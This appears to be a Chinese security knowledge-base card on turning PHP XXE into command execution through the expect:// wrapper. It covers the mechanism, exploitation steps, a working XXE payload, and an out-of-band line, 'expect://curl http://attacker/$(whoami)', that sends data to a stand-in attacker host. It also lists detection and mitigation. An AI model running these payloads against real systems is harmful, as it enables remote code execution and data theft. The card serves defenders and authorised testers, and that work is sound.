---
id: web-generic-xxe-expect-wrapper-command-execution
title: XXE + expect:// 包装器：PHP expect 扩展把外部实体解析升级为命令执行
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-expect-wrapper-command-execution
aliases:
- expect:// XXE
- PHP expect 扩展 RCE
- exp_popen 命令执行
- XXE 命令执行
- expect_fopen_wrapper
tags:
- php
- xxe
- expect
- command-injection
- rce
- stream-wrapper
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V423
  verified_at: '2026-11-09T17:06:50+08:00'
  notes: 已对照原文正文（PHP expect扩展、expect_fopen_wrapper.c 35行前缀检查、exp_popen→exp_spawnl→exp_spawnv、malloc argv、pty、fork(1909)、execvp(2217)、SYSTEM "expect://id" 实体、yum/pecl安装与extension=expect.so）核对，卡内原理/触发/PoC/防御一致；该段对应后半篇cdn外链图，tmp未提供，未能逐图核对。未验证点：PoC未复跑；expect需tcl/pty环境，原文仅在CentOS演示。无sources/文章ID/长段摘录，path web/generic/xxe合法；dedup候选(php-filter-ssrf等)非同链；dup-scan早于建卡无pair。
---

## 一句话结论

当目标 PHP 安装了 `expect` 扩展时，XXE 的外部实体可写成 `<!ENTITY xxe SYSTEM "expect://id">`；libxml 解析实体时调用 PHP 的 `expect://` 流包装器，包装器把 `expect://` 后的字符串交给 `exp_popen`，最终经 `exp_spawnl → exp_spawnv → fork + execvp` 执行命令，命令输出作为实体内容返回。这样原本只能读文件的 XXE 直接升级为命令执行。

## 原理

- **expect 扩展与流包装器**：PECL `expect` 为 PHP 注册 `expect://` 流包装器（`expect_fopen_wrapper.c`）。打开该 URL 时，包装器检查前缀并去掉 `expect://`，调用 `exp_popen(command)`。
- **命令执行链**：`exp_popen` → `exp_spawnl` → `exp_spawnv`，初始化参数数组后创建伪终端（pty），`fork()` 子进程并在子进程中 `execvp(file, argv)`；`file` 与 `argv` 即 `expect://` 后的命令字符串。
- **XXE 触发点**：XML 解析器遇到 `SYSTEM "expect://id"` 的外部实体时，会通过 PHP 的流包装层打开该 URL；如果 `expect` 扩展已加载，打开动作就变成执行 `id`，命令输出被当作实体值插入 XML/响应。
- **与文件读取的区别**：普通 XXE 用 `file://`/`php://filter` 读取文件；`expect://` 是执行型包装器，不需要上传文件、不写入磁盘，直接把 XXE 原语变成 RCE。
- **前提与限制**：PHP 需安装并加载 `expect` 扩展（`extension=expect.so`），且 XML 解析允许外部实体；`expect` 依赖 tcl/expect 库与 pty，部分精简环境不可用。输出受实体解析与回显方式限制，可能需要盲执行/带外确认。

## 触发条件

- 目标 PHP 安装并启用了 expect 扩展。
- 存在 XXE 注入点，且解析器未禁用外部实体/未使用 `LIBXML_NONET` 等防护。
- 攻击者能控制 DOCTYPE/实体定义，且响应或带外通道能反映命令结果。
- 目标系统允许创建 pty 与执行命令（容器/受限环境可能失败）。

## 利用步骤

1. 确认 XXE 注入点（回显/报错/OOB 均可）。
2. 探测 expect 扩展是否可用：构造 `<!ENTITY xxe SYSTEM "expect://id">` 并在 XML 中使用 `&xxe;`，观察实体值是否变成命令输出。
3. 若回显受限，改用带外命令（`expect://curl ...`、`expect://ping ...`）确认执行。
4. 执行读取/反弹 Shell 等命令；注意命令中的空格与特殊字符需符合 expect/execvp 的参数解析。
5. 结合业务上下文选择低噪声命令，确认权限后清理。

## PoC

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

```bash
# 环境准备（CentOS 示例，仅授权测试）
sudo yum install php-devel expect tcl-devel expect-devel php-pear
sudo pecl install expect
# php.ini 添加 extension=expect.so 后重启 PHP-FPM/Apache
```

```text
预期：实体 &xxe; 被替换为 `id` 的输出（uid=... gid=...）。
```

## 变体与关联

- 带外执行：`expect://curl http://attacker/$(whoami)` 一类，把结果外带；也可用 `ping`/`nslookup` 做 DNS 确认。
- 其他包装器：`php://filter` 用于读源码，`data://` 用于本地包含 RCE，`expect://` 是 XXE 场景下的执行型包装器。
- 关联：[[web-generic-xxe-inband-file-read-default-insecure]]（基础 XXE 文件读取）、[[web-php-file-inclusion-data-wrapper-short-tag-rce]]（data:// 包装器 RCE）、[[web-generic-xxe-utf16be-encoding-filter-bypass]]（XXE 编码绕过，提及 expect 变体）。

## 检测与防御

- **修复**：禁用/卸载 expect 扩展（生产环境通常不需要）；XXE 侧禁用外部实体（`libxml_disable_entity_loader(true)`，PHP 8 默认不加载外部实体但仍应显式配置）、拒绝 DOCTYPE、使用 `LIBXML_NONET`。
- **检测**：XML 请求中出现 `expect://`、`SYSTEM`/`ENTITY` 定义；PHP 进程派生 pty/expect 子进程；异常 DNS/HTTP 外带。
- **加固**：最小化 PHP 扩展；WAF 拦截 DOCTYPE/ENTITY/expect://（仅缓解）；以低权限运行 PHP-FPM。
